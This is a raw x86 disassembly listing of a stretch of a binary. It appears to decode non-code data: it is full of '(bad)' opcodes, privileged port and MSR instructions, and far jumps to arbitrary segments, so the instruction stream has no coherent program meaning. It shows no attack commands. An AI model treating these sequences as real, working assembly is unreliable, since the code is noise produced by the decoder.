  412e9b:	xor    esp,DWORD PTR [edi+edx*2+0x332e183e]
  412ea2:	popa   
  412ea3:	xchg   ebp,eax
  412ea4:	or     BYTE PTR [ecx+0x6b],al
  412ea7:	and    BYTE PTR [esi],al
  412ea9:	pop    ebx
  412eaa:	pushf  
  412eab:	add    DWORD PTR ds:[edi-0x65],edx
  412eaf:	lea    edi,[esi+0x5b]
  412eb2:	push   ss
  412eb3:	sahf   
  412eb4:	call   0xbe4955f9
  412eb9:	shr    DWORD PTR [eax-0xbf26fd],1
  412ebf:	popf   
  412ec0:	clc    
  412ec1:	push   esi
  412ec2:	imul   ecx,DWORD PTR [ebp-0x6211a482],0xffffffc0
  412ec9:	inc    eax
  412eca:	out    0x17,eax
  412ecc:	mov    dl,0x33
  412ece:	jmp    0x9647:0xaf40b09f
  412ed5:	pop    edx
  412ed6:	out    0x3,eax
  412ed8:	fadd   QWORD PTR ds:[eax+eiz*1]
  412edc:	enter  0xe79a,0x9c
  412ee0:	or     eax,0x9df6a72
  412ee5:	shr    DWORD PTR [eax],1
  412ee7:	add    al,0x0
	...
  412f11:	add    BYTE PTR [ecx+0x3a80c7c7],al
  412f17:	xlat   BYTE PTR ds:[ebx]
  412f18:	ins    DWORD PTR es:[edi],dx
  412f19:	inc    ebx
  412f1a:	ds inc eax
  412f1c:	sbb    al,0xf5
  412f1e:	loope  0x412ed9
  412f20:	push   ecx
  412f21:	inc    esp
  412f22:	ds into 
  412f24:	sub    al,0xac
  412f26:	or     DWORD PTR [eax-0xb],eax
  412f29:	scas   eax,DWORD PTR es:[edi]
  412f2a:	push   eax
  412f2b:	mov    BYTE PTR [eax],0xe5
  412f2e:	stos   BYTE PTR es:[edi],al
  412f2f:	(bad)  
  412f30:	or     BYTE PTR [ecx+0x66fe4332],al
  412f36:	add    eax,0x68e9111a
  412f3b:	aam    0xec
  412f3d:	push   0xfffffff6
  412f3f:	xor    edi,esi
  412f41:	aam    0x35
  412f43:	xor    edi,DWORD PTR [edi]
  412f45:	pushf  
  412f46:	mov    edx,0xc0d96b40
  412f4b:	xchg   esi,eax
  412f4c:	lock cdq 
  412f4e:	stos   BYTE PTR es:[edi],al
  412f4f:	(bad)  
  412f50:	or     BYTE PTR [ecx+0x6a],al
  412f53:	lods   eax,DWORD PTR ds:[esi]
  412f54:	std    
  412f55:	es inc edi
  412f57:	sbb    esi,DWORD PTR [ebp+eiz*8+0x4]
  412f5b:	sbb    cl,BYTE PTR [ecx]
  412f5d:	jmp    0x53a99a79
  412f62:	push   ss
  412f63:	call   0x1151:0x4b817400
  412f6a:	sub    BYTE PTR [ebp+edi*8+0x741b36f6],ah
  412f71:	in     eax,0xf4
  412f73:	sbb    DWORD PTR [ecx],ecx
  412f75:	jmp    0x412f7a
	...
  412f9e:	add    BYTE PTR [eax],al
  412fa0:	adc    BYTE PTR [esi+0x5b3de8ec],0x0
  412fa7:	add    BYTE PTR fs:[edi],ch
  412faa:	push   ecx
  412fab:	into   
  412fac:	dec    eax
  412fad:	push   ebx
  412fae:	call   0xfe818068
  412fb3:	bnd jge 0x412f81
  412fb6:	push   es
  412fb7:	push   0x28
  412fb9:	das    
  412fba:	add    DWORD PTR [eax+edi*1],esi
  412fbd:	je     0x412f7f
  412fbf:	mov    al,0x7f
  412fc1:	push   edi
  412fc2:	add    BYTE PTR [ecx],bh
  412fc4:	addr16 adc ch,dl
  412fc7:	in     al,dx
  412fc8:	lods   al,BYTE PTR ds:[esi]
  412fc9:	aaa    
  412fca:	jb     0x412fb4
  412fcc:	cld    
  412fcd:	push   ebx
  412fce:	rol    BYTE PTR [eax],0x5a
  412fd1:	out    0x55,al
  412fd3:	cmp    DWORD PTR [edi+0xf05735c],0x5c
  412fda:	add    BYTE PTR [ecx],al
  412fdc:	push   edi
  412fdd:	(bad)  
  412fdf:	add    DWORD PTR [ebx],ebx
  412fe1:	pop    ecx
  412fe2:	sub    eax,eax
  412fe4:	outs   dx,BYTE PTR ds:[esi]
  412fe5:	sbb    al,0x6
  412fe7:	add    BYTE PTR [esi+eiz*2-0x31e8be72],dh
  412fee:	inc    esp
  412fef:	in     al,dx
  412ff0:	mov    bh,0xdf
  412ff2:	je     0x412ffc
  412ff4:	outs   dx,DWORD PTR ds:[esi]
  412ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff6:	push   esp
  412ff7:	call   DWORD PTR [eax-0x25]
  412ffa:	cmc    
  412ffb:	add    ebx,ecx
  412ffd:	push   ebp
  412ffe:	cmp    eax,0x830665e5
	...
  41302c:	add    BYTE PTR [eax],al
  41302e:	shr    dh,cl
  413030:	std    
  413031:	je     0x41300c
  413033:	xor    edi,DWORD PTR [esi+0x5215c9]
  413039:	lea    ebp,[edx+0x4aff4dee]
  41303f:	push   edx
  413040:	call   0xff20dad7
  413045:	or     edi,0x5c
  413048:	je     0x41304f
  41304a:	and    al,0xdf
  41304c:	push   DWORD PTR [ecx+ebx*4-0x2b]
  413050:	jl     0x41303e
  413052:	xchg   edi,eax
  413053:	imul   eax,DWORD PTR [esi],0x2b
  413056:	xlat   BYTE PTR ds:[ebx]
  413057:	adc    al,al
  413059:	or     BYTE PTR [edi+0x37ec44d3],ah
  41305f:	loop   0x4130d5
  413061:	or     BYTE PTR [edi+0x67],bh
  413064:	push   ebx
  413065:	call   eax
  413067:	dec    esi
  413068:	shl    BYTE PTR [ebp+0x69],0xd5
  41306c:	jl     0x41305a
  41306e:	imul   eax,DWORD PTR ds:0x3e2b,0xfffffff4
  413074:	retf   
  413075:	shl    DWORD PTR [esi],0x34
  413078:	mov    DWORD PTR [edx+ebp*2+0x64],eax
  41307c:	cdq    
  41307d:	je     0x4130c5
  41307f:	in     al,dx
  413080:	xor    BYTE PTR [ebp+0x49],dl
  413083:	lds    eax,FWORD PTR [ebp+0x46fef7]
  413089:	cmp    DWORD PTR [ebx+0x387504a8],0x69
  413090:	(bad)  
  413091:	enter  0x0,0x0
	...
  4130b9:	add    BYTE PTR [eax],al
  4130bb:	add    ah,bh
  4130bd:	cmp    eax,DWORD PTR [edx]
  4130bf:	lea    edi,[ebx-0x80]
  4130c2:	xor    al,0xff
  4130c4:	xchg   ebx,eax
  4130c5:	dec    esp
  4130c6:	stos   BYTE PTR es:[edi],al
  4130c7:	imul   edi,DWORD PTR ss:[ebp-0x67],0xffffff82
  4130cc:	push   es
  4130cd:	push   esp
  4130ce:	clts   
  4130d0:	mov    ebp,0x72ffa5ee
  4130d5:	cs out dx,eax
  4130d7:	mov    edi,0xc7207
  4130dc:	mov    ebx,0xe14fa5ee
  4130e1:	out    0x9,al
  4130e3:	call   0xfedc101c
  4130e8:	mov    ebp,0x4074e45b
  4130ed:	mov    cl,0x17
  4130ef:	in     al,dx
  4130f0:	ds (bad) 
  4130f2:	jmp    FWORD PTR [edx]
  4130f4:	jle    0x413100
  4130f6:	les    eax,FWORD PTR [edi]
  4130f8:	ds scas eax,DWORD PTR es:[edi]
  4130fa:	inc    eax
  4130fb:	in     al,dx
  4130fc:	push   cs
  4130fd:	call   0x25aa:0x3c2bfee4
  413104:	repz adc al,0x9b
  413107:	mov    ebx,?
  413109:	rdmsr  
  41310b:	call   DWORD PTR [ebx]
  41310d:	cmp    al,0xaa
  41310f:	xchg   ebp,eax
  413110:	jmp    0xe85a:0x76829aec
  413117:	adc    eax,0x69fda45
  41311c:	icebp  
  41311d:	push   esp
  41311e:	push   0x18
	...
  413148:	add    BYTE PTR [eax],al
  41314a:	push   edx
  41314b:	pop    edx
  41314c:	adc    al,0x2
  41314e:	and    eax,0x39c5b11b
  413153:	pop    ebx
  413154:	dec    edx
  413155:	sbb    edi,DWORD PTR [eax-0x5771865]
  41315b:	sbb    BYTE PTR cs:[esi],ch
  41315e:	data16 cmp al,0xdd
  413161:	or     esp,DWORD PTR [esi]
  413163:	dec    ebx
  413164:	mov    ah,0x9a
  413166:	sub    BYTE PTR [ebp+ebx*1+0x5c5b6158],dh
  41316d:	inc    eax
  41316e:	sub    ch,BYTE PTR [ecx+edx*8-0x1438eefc]
  413175:	call   0x3d08:0x273f5392
  41317c:	das    
  41317d:	int3   
  41317e:	call   DWORD PTR [ebx-0x19]
  413181:	xor    ch,al
  413183:	das    
  413184:	imul   edi,DWORD PTR [edi-0x6853311b],0x71
  41318b:	xor    edx,DWORD PTR [eax]
  41318d:	xor    ebx,ecx
  41318f:	cmp    al,0x7
  413191:	adc    dl,dl
  413193:	cmp    al,0x75
  413195:	pop    es
  413196:	(bad)  
  413197:	das    
  413198:	call   0x490f:0x2750c09a
  41319f:	cmp    al,0x5d
  4131a1:	or     al,0xb1
  4131a3:	(bad)  
  4131a4:	fld    TBYTE PTR [esp+eiz*2+0x3499d73d]
  4131ab:	sbb    edx,DWORD PTR [ebp+0x4]
	...
  4131d6:	add    BYTE PTR [eax],al
  4131d8:	cdq    
  4131d9:	mov    bl,0xac
  4131dc:	mov    gs,WORD PTR [ebx+0x197699be]
  4131e2:	add    ebp,esp
  4131e4:	cmp    eax,0xd7bd89a6
  4131e9:	(bad)  
  4131ea:	or     al,0x91
  4131ec:	adc    ebx,DWORD PTR [edi+0x1b3b9efd]
  4131f2:	jne    0x4131be
  4131f4:	mov    bh,0x10
  4131f7:	cmp    DWORD PTR [edx-0x4879a46d],ebp
  4131fd:	mov    WORD PTR [eax-0x80],gs
  413200:	in     al,0x7b
  413202:	add    BYTE PTR [esi+0x31],dh
  413205:	arpl   bp,di
  413207:	hlt    
  413208:	sub    DWORD PTR [ebp+edi*8-0x76ccba24],ecx
  41320f:	imul   eax,edi,0x6515e93c
  413215:	cmp    al,0xfe
  413217:	and    BYTE PTR [eax],al
  413219:	push   0x2fc29c00
  41321e:	imul   ebp,ecx,0xc1bf2c3d
  413224:	lahf   
  413225:	mov    eax,0xc6d6e93f
  41322a:	or     al,0x93
  41322c:	repz cmp al,0x74
  41322f:	icebp  
  413230:	xchg   ebp,eax
  413231:	jmp    0x413230
  413233:	push   ss
  413234:	(bad)  
  413235:	mov    bl,0x0
  413237:	jmp    0x56aa2fe2
	...
  413264:	add    BYTE PTR [eax],al
  413266:	push   ds
  413267:	call   0xd36a:0x4f38fe00
  41326e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41326f:	(bad)  
  413270:	or     BYTE PTR [ecx],al
  413272:	xor    eax,0x65e6fe3d
  413277:	pop    ebx
  413278:	add    dh,cl
  41327a:	pop    es
  41327b:	mov    ah,0xa6
  41327d:	dec    ebp
  41327e:	std    
  41327f:	pop    edx
  413280:	std    
  413281:	push   esp
  413282:	inc    esi
  413283:	mov    cl,0x1c
  413285:	add    BYTE PTR [eax+0x4c],bh
  413288:	or     al,ch
  41328a:	adc    eax,0xfffffee3
  41328f:	push   esi
  413290:	add    bh,ch
  413292:	jmp    0x26a5e006
  413297:	push   edi
  413298:	std    
  413299:	jne    0x4132f6
  41329b:	ins    DWORD PTR es:[edi],dx
  41329c:	sbb    al,0xff
  41329e:	inc    edx
  41329f:	dec    edi
  4132a0:	call   0xff23fb10
  4132a5:	push   0xbeed5767
  4132aa:	das    
  4132ab:	mov    ecx,0xe2574161
  4132b0:	je     0x4132be
  4132b2:	cmp    eax,0x2f75ff40
  4132b7:	pop    es
  4132b8:	push   edx
  4132b9:	dec    DWORD PTR [eax+0x170065d3]
  4132bf:	add    al,0xbc
  4132c1:	push   0x3f5a98
  4132c6:	js     0x413331
  4132c8:	or     al,0x6a
	...
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	xor    al,0xd4
  4132f6:	je     0x413300
  4132f8:	jg     0x41330b
  4132fa:	(bad)  
  4132fb:	jmp    FWORD PTR [eax]
  4132fd:	and    eax,0x89e708c0
  413302:	mov    esp,ebp
  413304:	push   esp
  413305:	cli    
  413306:	stc    
  413307:	push   0xffffffd7
  413309:	mov    BYTE PTR [edx],dh
  41330b:	push   DWORD PTR [edx-0x4d32179a]
  413311:	sar    esi,cl
  413313:	mov    DWORD PTR [edx-0x4db89a2e],esp
  413319:	popf   
  41331a:	add    bh,bh
  41331c:	xor    ah,BYTE PTR [esi-0x18]
  41331f:	dec    ebp
  413320:	cwde   
  413321:	sar    dh,cl
  413323:	call   DWORD PTR [edx]
  413325:	sar    esi,cl
  413327:	jne    0x413367
  413329:	cmp    al,0xaa
  41332b:	div    ebx
  41332d:	sub    BYTE PTR [esi+0x2487cc8],dl
  413333:	push   ebp
  413334:	mov    ch,0x28
  413336:	add    bl,0x82
  413339:	sahf   
  41333a:	add    al,0x6a
  41333c:	sub    eax,0x66081009
  413341:	loopne 0x413372
  413343:	jmp    FWORD PTR [ecx-0x55]
  413346:	aas    
  413347:	cld    
  413348:	(bad)  
  413349:	jns    0x41336a
  41334b:	inc    ecx
  41334c:	ds jmp 0x40a73b61
  413352:	xchg   edi,eax
  413353:	dec    BYTE PTR [ecx-0x47]
  413356:	paddb  mm0,QWORD PTR [eax]
	...
  413381:	add    BYTE PTR [ecx+0x37],al
  413384:	or     ch,al
  413386:	add    DWORD PTR [edi-0x6b],ecx
  413389:	inc    BYTE PTR [edi]
  41338b:	xchg   BYTE PTR [eax],al
  41338d:	add    BYTE PTR [ebx-0x57d5753],dl
  413393:	mov    ebp,DWORD PTR [edx]
  413395:	add    BYTE PTR [eax+edx*2-0x73b98b6b],ah
  41339c:	sub    DWORD PTR [ebp+0x9],edx
  41339f:	jns    0x41332c
  4133a1:	inc    esp
  4133a2:	add    bl,BYTE PTR [edx+eiz*1]
  4133a5:	gs jg  0x4133ec
  4133a8:	xchg   edi,eax
  4133a9:	je     0x4133f1
  4133ab:	dec    esp
  4133ac:	test   eax,0x2a58e9fd
  4133b1:	add    BYTE PTR [esi-0x3c],dl
  4133b4:	pop    ds
  4133b5:	inc    ecx
  4133b6:	fsub   QWORD PTR ds:0x97447f65
  4133bd:	xor    al,0x98
  4133bf:	jmp    0x413405
  4133c1:	add    dh,dl
  4133c3:	daa    
  4133c4:	cmp    edi,edi
  4133c6:	mov    ecx,0x7173c23c
  4133cb:	pop    ebx
  4133cc:	jo     0x41340e
  4133ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133cf:	ret    0x55e0
  4133d2:	popa   
  4133d3:	pop    ebx
  4133d4:	aas    
  4133d5:	add    al,0x3e
  4133d7:	dec    edx
  4133d8:	mov    gs,WORD PTR [ebx]
  4133da:	fdivr  DWORD PTR [esi-0x5076fbd8]
  4133e0:	mov    edi,0xbf630a96
  4133e5:	rol    DWORD PTR [eax],1
	...
  41340f:	add    al,bh
  413411:	cmp    DWORD PTR [edi+0x27f8772b],ebp
  413417:	add    al,0xd6
  413419:	pop    edx
  41341a:	out    0xa6,eax
  41341c:	mov    ds:0xff1f46c2,eax
  413421:	pop    edx
  413422:	mov    ss,WORD PTR [eax]
  413424:	push   esi
  413425:	cmp    ebp,edi
  413427:	or     edx,DWORD PTR [esi+0x52]
  41342a:	(bad)  
  41342b:	xchg   esi,eax
  41342c:	inc    eax
  41342d:	cmp    ebp,edi
  41342f:	fwait
  413430:	and    DWORD PTR [ebx],esp
  413432:	pop    ss
  413433:	xchg   edi,eax
  413434:	xor    BYTE PTR [ecx],bh
  413436:	fst    QWORD PTR [edi-0x541050d8]
  41343c:	mov    ss,WORD PTR gs:[esi-0x6a]
  413440:	push   es
  413441:	push   ds
  413442:	in     al,0x3
  413444:	imul   esp,esp,0x53
  413447:	cmp    ch,0x37
  41344a:	rol    BYTE PTR [ebx],cl
  41344c:	xchg   esp,eax
  41344d:	outs   dx,BYTE PTR ds:[esi]
  41344e:	adc    BYTE PTR ss:[esi+0x43],al
  413452:	dec    eax
  413453:	das    
  413454:	icebp  
  413455:	cmp    BYTE PTR [ecx+0x40],dh
  413458:	jmp    0x165b:0x7f206bc3
  41345f:	adc    BYTE PTR [esi+0x43],al
  413462:	mov    BYTE PTR [ebp+0x100738d0],dl
  413468:	retf   0x7538
  41346b:	or     edx,esi
  41346d:	add    BYTE PTR fs:[eax+edx*8+0x2bc839],bl
	...
  41349d:	add    BYTE PTR [ecx-0x298daac8],dh
  4134a3:	ffree  st(4)
  4134a5:	fst    QWORD PTR [ebx+ebx*2+0x6a]
  4134a9:	pop    ds
  4134aa:	mov    bl,0xaf
  4134ac:	or     cl,al
  4134ae:	sbb    ecx,DWORD PTR [ebp+edi*8-0x3604a3a]
  4134b5:	push   ecx
  4134b6:	adc    DWORD PTR [edi-0x502d16c1],edi
  4134bc:	or     cl,al
  4134be:	pop    ebx
  4134bf:	ss (bad) 
  4134c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134c2:	shr    DWORD PTR [edi+0x63319efc],cl
  4134c8:	call   0xfe794380
  4134cd:	mov    al,ds:0x1c005c7c
  4134d2:	mov    bh,0x44
  4134d4:	and    BYTE PTR [ebp+0x300c2a6],0xb
  4134db:	cmp    DWORD PTR [ecx+eiz*8-0x1b],esi
  4134df:	mov    ch,0x54
  4134e1:	shl    dx,cl
  4134e4:	inc    ebx
  4134e5:	pop    ebp
  4134e6:	push   edx
  4134e7:	fsub   DWORD PTR [ebx-0x58]
  4134ea:	cmp    eax,0xe5e17438
  4134ef:	xor    eax,0x38b346fc
  4134f4:	je     0x413533
  4134f6:	stos   DWORD PTR es:[edi],eax
  4134f7:	scas   al,BYTE PTR es:[edi]
  4134f8:	or     BYTE PTR [ecx+0x65],al
  4134fb:	mov    ebp,?
  4134fd:	cs add eax,0xe9051a
	...
  41352b:	add    BYTE PTR [eax],bl
  41352d:	in     al,0xec
  41352f:	push   0xfffffffe
  413531:	xor    ebp,DWORD PTR [ebx-0x17]
  413534:	daa    
  413535:	jae    0x413534
  413537:	xchg   esp,eax
  413538:	inc    ebp
  413539:	inc    ebx
  41353a:	dec    esp
  41353b:	add    BYTE PTR [ebx-0x65760132],ch
  413541:	iret   
  413542:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  413544:	retf   0x9c
  413547:	jmp    FWORD PTR [edx]
  413549:	fs call 0xff0fd81c
  41354f:	dec    DWORD PTR [edx]
  413551:	sar    esi,cl
  413553:	jne    0x4134f4
  413555:	add    esi,DWORD PTR [esi+0x54]
  413558:	or     dh,0xc8
  41355b:	ret    0x5b9b
  41355e:	push   ebx
  41355f:	mov    esi,DWORD PTR [ebx-0x32]
  413562:	je     0x413570
  413564:	jg     0x413500
  413566:	pop    ecx
  413567:	jmp    DWORD PTR [eax+0x4274c062]
  41356d:	xchg   DWORD PTR [edx+0x505f1665],edi
  413573:	call   0x3ea718
  413578:	pop    ss
  413579:	into   
  41357a:	je     0x41358c
  41357c:	daa    
  41357d:	into   
  41357e:	je     0x413588
  413580:	scas   eax,DWORD PTR es:[edi]
  413581:	inc    ecx
  413582:	xlat   BYTE PTR ds:[ebx]
  413583:	push   DWORD PTR [eax-0x5fa937fe]
  413589:	iret   
  41358a:	enter  0x33c2,0x5b
  41358e:	push   ebx
  41358f:	mov    eax,DWORD PTR [eax]
	...
  4135b9:	add    BYTE PTR [ebx-0x25],dh
  4135bc:	sar    eax,0xd8
  4135bf:	test   BYTE PTR [eax],al
  4135c1:	push   0x2e
  4135c3:	shl    BYTE PTR [eax+ecx*1+0x6f],1
  4135c7:	add    edx,DWORD PTR [ebx-0x1]
  4135ca:	inc    eax
  4135cb:	loope  0x413611
  4135cd:	cld    
  4135ce:	pop    esp
  4135cf:	or     eax,0x5aa64830
  4135d4:	cmp    BYTE PTR [edi],0xd7
  4135d7:	data16 jl 0x413642
  4135da:	xchg   BYTE PTR [ebp+0x3f],dl
  4135dd:	add    BYTE PTR [esi],bh
  4135df:	cmc    
  4135e0:	test   eax,0x2447d0d
  4135e5:	or     edi,esi
  4135e7:	mov    eax,0xe2d65734
  4135ec:	and    edi,edi
  4135ee:	mov    ecx,0xb73c239
  4135f3:	mov    ebx,0x97a9f83e
  4135f8:	mov    WORD PTR [ecx+0x44],gs
  4135fb:	adc    eax,0xc6a60818
  413600:	xchg   ecx,eax
  413601:	(bad)  
  413602:	xchg   ecx,eax
  413603:	and    eax,0x4014f818
  413608:	xchg   ebx,eax
  413609:	je     0x413641
  41360b:	or     al,0xc
  41360d:	(bad)  
  41360e:	jns    0x4135fd
  413610:	xchg   ecx,eax
  413611:	je     0x413689
  413613:	call   0x6b9a:0x2bf3fee5
  41361a:	popa   
  41361b:	aad    0x91
  41361d:	add    BYTE PTR [bx+si],al
	...
  413648:	and    BYTE PTR [edi+0x43],0x0
  41364c:	push   ecx
  41364d:	dec    edi
  41364e:	mov    edi,fs
  413650:	push   edx
  413651:	jnp    0x4135e4
  413653:	(bad)  
  413654:	xor    eax,0x8e121904
  413659:	lods   eax,DWORD PTR ds:[esi]
  41365a:	pop    ss
  41365b:	clc    
  41365c:	mov    es,ebp
  41365e:	pop    ss
  41365f:	or     BYTE PTR [esi],dl
  413661:	fnstsw WORD PTR [edx-0x2e73de02]
  413667:	push   ebp
  413668:	sbb    DWORD PTR [ebp-0x63e98b6f],ecx
  41366e:	fst    DWORD PTR [ebp+0x9]
  413671:	popf   
  413672:	nop
  413673:	xor    bh,dh
  413675:	ficom  DWORD PTR [ecx-0x69930602]
  41367b:	lods   eax,DWORD PTR ds:[esi]
  41367c:	ss cmp eax,0x5ae98419
  413682:	pushf  
  413683:	(bad)  
  413684:	loopne 0x413635
  413686:	out    dx,eax
  413687:	fwait
  413688:	mov    ch,0x89
  41368a:	push   ss
  41368b:	xchg   ebx,eax
  41368c:	jo     0x4136b2
  41368e:	sub    cl,BYTE PTR [eax]
  413690:	ds nop
  413692:	jb     0x413634
  413694:	shr    BYTE PTR [edi-0x6edc6415],0xf6
  41369b:	xchg   edx,eax
  41369c:	inc    esp
  41369d:	sbb    esi,DWORD PTR [eax+esi*8+0x21]
  4136a1:	or     cl,BYTE PTR [ebp+0x45]
  4136a4:	ds mov ecx,edi
  4136a7:	xchg   ebp,eax
  4136a8:	div    BYTE PTR ds:0x33d7
	...
  4136d6:	xchg   ecx,eax
  4136d7:	scas   eax,DWORD PTR es:[edi]
  4136d8:	div    DWORD PTR [ebx]
  4136da:	mov    DWORD PTR [edi+0xcf29bef],ebp
  4136e0:	mov    edi,0x1d476192
  4136e5:	xchg   ebx,eax
  4136e6:	jo     0x41370b
  4136e8:	stos   BYTE PTR es:[edi],al
  4136e9:	jmp    FWORD PTR [ecx-0x72]
  4136ec:	jb     0x41368d
  4136ee:	mov    esp,0xe43aa01e
  4136f3:	pop    edx
  4136f4:	add    esi,ecx
  4136f6:	push   eax
  4136f7:	scas   eax,DWORD PTR es:[edi]
  4136f8:	fistp  WORD PTR [ebx-0x6d7975c5]
  4136fe:	mov    dh,0x9f
  413700:	jnp    0x413780
  413702:	jp     0x41376d
  413704:	pop    ds
  413705:	inc    ebp
  413706:	fld    TBYTE PTR ds:[esi-0x306d4dfd]
  41370d:	rcr    DWORD PTR [edx+0x263ae79a],0x6b
  413714:	test   eax,0x27603e03
  413719:	pop    ss
  41371a:	dec    edx
  41371b:	mov    WORD PTR [edi-0x78],cs
  41371e:	pusha  
  41371f:	xor    al,0x3f
  413721:	(bad)  
  413722:	mov    ecx,0x72fb00af
  413727:	lahf   
  413728:	clc    
  413729:	cs inc esi
  41372b:	xor    ebp,DWORD PTR [ebx+0x3]
  41372e:	int    0xaf
  413730:	or     BYTE PTR [ecx],dl
  413732:	(bad)  
  413733:	xor    eax,0xafac16fe
  413738:	clc    
  413739:	add    DWORD PTR [eax],0x0
	...
  413764:	fnstenv ds:0xb3a5f174
  41376a:	std    
  41376b:	dec    bh
  41376d:	xor    eax,0x7852f174
  413772:	std    
  413773:	je     0x41371a
  413775:	cmp    al,0x6d
  413777:	out    0xcf,al
  413779:	xor    eax,0x3cca54fe
  41377e:	jl     0x4137bc
  413780:	scas   eax,DWORD PTR es:[edi]
  413781:	xor    eax,0xf3821afd
  413786:	std    
  413787:	(bad)  
  413788:	scas   eax,DWORD PTR es:[edi]
  413789:	xor    eax,0x5d8a8ff3
  41378e:	jae    0x41371e
  413790:	iret   
  413791:	scas   eax,DWORD PTR es:[edi]
  413792:	cld    
  413793:	scas   al,BYTE PTR es:[edi]
  413794:	push   ecx
  413795:	arpl   ax,bp
  413797:	mov    ebp,DWORD PTR [eax]
  413799:	xor    al,0xfe
  41379b:	ds xchg ebp,eax
  41379d:	sbb    al,BYTE PTR ds:0xece008e9
  4137a3:	push   0x76
  4137a5:	xor    BYTE PTR [esi+0x13],dl
  4137a8:	cmp    al,cl
  4137aa:	cmp    DWORD PTR [esi+0x51],edi
  4137ad:	arpl   ax,bp
  4137af:	ins    DWORD PTR es:[edi],dx
  4137b0:	push   0x8160fe34
  4137b5:	aaa    
  4137b6:	mov    ah,BYTE PTR [eax+ecx*1]
  4137b9:	pushf  
  4137ba:	aas    
  4137bb:	jmp    0xdd41ac7d
  4137c0:	jge    0x413785
  4137c2:	faddp  st(4),st
  4137c4:	jl     0x413821
  4137c6:	push   ebp
	...
  4137ef:	add    BYTE PTR [eax],al
  4137f1:	add    BYTE PTR [edi-0x3e],ch
  4137f4:	inc    eax
  4137f5:	add    bh,ah
  4137f7:	ss mov esi,0xe8724474
  4137fd:	sti    
  4137fe:	mov    ecx,0x170bfeca
  413803:	push   ebx
  413804:	pop    ss
  413805:	push   eax
  413806:	scas   eax,DWORD PTR es:[edi]
  413807:	push   edi
  413808:	add    bh,ch
  41380a:	imul   edx,DWORD PTR [edi-0x18],0x50579665
  413811:	inc    DWORD PTR [edx+0x30]
  413814:	out    0x3,al
  413816:	cmp    ebx,ecx
  413818:	(bad)  
  413819:	call   0x3ea4b9
  41381e:	fwait
  41381f:	push   cs
  413820:	mov    esi,0xfeca98b9
  413825:	push   DWORD PTR [ebp-0x47]
  413828:	xor    eax,0xff1ef207
  41382d:	jne    0x4138aa
  41382f:	retf   0x874
  413832:	outs   dx,DWORD PTR ds:[esi]
  413833:	dec    eax
  413834:	push   edx
  413835:	(bad)  
  413836:	mov    eax,0x63c2c76a
  41383b:	push   edi
  41383c:	push   ebx
  41383d:	mov    ebp,DWORD PTR [ebx-0x2b173e22]
  413843:	and    al,0x3e
  413845:	dec    ebx
  413846:	es pop edi
  413848:	add    BYTE PTR [ebp+0x63],dh
  41384b:	lock mov edi,0x55570c
  413851:	push   0x57
  413853:	push   ebp
  413854:	std    
  413855:	inc    DWORD PTR [eax]
	...
  41387f:	add    BYTE PTR [edx],dh
  413881:	xor    ebp,DWORD PTR [eax+0x0]
  413884:	cmp    eax,0x5795e857
  413889:	push   edi
  41388a:	add    BYTE PTR [ecx+0x75fee6d2],cl
  413890:	lahf   
  413891:	(bad)  
  413892:	aam    0x54
  413894:	mov    DWORD PTR ds:[eax-0x6f5f7c78],edx
  41389b:	je     0x4138a3
  41389d:	call   0x7490:0x7164fc16
  4138a4:	inc    edx
  4138a5:	push   ds
  4138a6:	add    ch,BYTE PTR [edx+0x3e]
  4138a9:	pushf  
  4138aa:	adc    al,0x40
  4138ac:	ds inc esp
  4138ae:	jg     0x4138f4
  4138b0:	shl    ah,cl
  4138b2:	sbb    eax,DWORD PTR [eax]
  4138b4:	fs inc esp
  4138b6:	sbb    al,0x12
  4138b8:	push   esp
  4138b9:	inc    esp
  4138ba:	xchg   ecx,eax
  4138bb:	je     0x41387f
  4138bd:	pop    ecx
  4138be:	idiv   BYTE PTR [edi]
  4138c0:	add    eax,0x7e850203
  4138c5:	cmp    DWORD PTR [edx-0x79],edi
  4138c8:	ds inc esp
  4138ca:	add    cl,BYTE PTR [ebx+0x117a100b]
  4138d0:	retf   
  4138d1:	ja     0x413867
  4138d3:	dec    edi
  4138d4:	and    al,0x44
  4138d6:	sbb    BYTE PTR [edx],dl
  4138d8:	adc    al,0x44
  4138da:	sbb    cl,BYTE PTR ds:0xff048318
  4138e0:	repz out 0x8d,eax
  4138e3:	push   ecx
	...
  41390c:	add    BYTE PTR [eax],al
  41390e:	dec    esi
  41390f:	mov    edi,0x10977c4
  413914:	sbb    al,dh
  413916:	push   esi
  413917:	test   BYTE PTR [eax-0x1],al
  41391a:	pop    ecx
  41391b:	stos   DWORD PTR es:[edi],eax
  41391c:	inc    edi
  41391d:	call   0x485a3d67
  413922:	dec    ecx
  413923:	inc    edi
  413924:	pushf  
  413925:	out    0xd2,eax
  413927:	dec    edi
  413928:	(bad)  
  413929:	inc    bh
  41392b:	jbe    0x4138cd
  41392d:	(bad)  
  41392e:	stos   DWORD PTR es:[edi],eax
  41392f:	mov    ah,0x9c
  413931:	push   edx
  413932:	js     0x4138f5
  413934:	(bad)  
  413935:	(bad)  
  413936:	stos   DWORD PTR es:[edi],eax
  413937:	pop    ebx
  413938:	dec    edi
  413939:	(bad)  
  41393a:	xchg   edx,eax
  41393b:	aas    
  41393c:	pop    edi
  41393d:	sbb    DWORD PTR [esi],ecx
  41393f:	inc    ebx
  413940:	sub    eax,0xe3320940
  413945:	ret    
  413946:	lea    edx,[esi-0x31]
  413949:	add    edi,DWORD PTR [esi]
  41394b:	inc    edx
  41394c:	jle    0x4138dd
  41394e:	push   0x63
  413950:	aas    
  413951:	mov    al,0x79
  413953:	xor    ch,BYTE PTR [edi]
  413955:	(bad)
  413959:	sbb    edx,ebp
  41395b:	xor    DWORD PTR [ebp-0x47a92605],edx
  413961:	mov    cs,eax
  413963:	xor    DWORD PTR [ebp-0x64b82661],edx
  413969:	mov    ?,WORD PTR [eax-0x666c8acf]
  41396f:	fisub  WORD PTR [edx+0x8e]
	...
  413999:	add    BYTE PTR [eax],al
  41399b:	add    BYTE PTR [eax-0x4b686b1b],ch
  4139a1:	dec    esp
  4139a2:	out    0x18,al
  4139a4:	xchg   edx,eax
  4139a5:	xor    DWORD PTR [edx],edi
  4139a7:	cld    
  4139a8:	nop
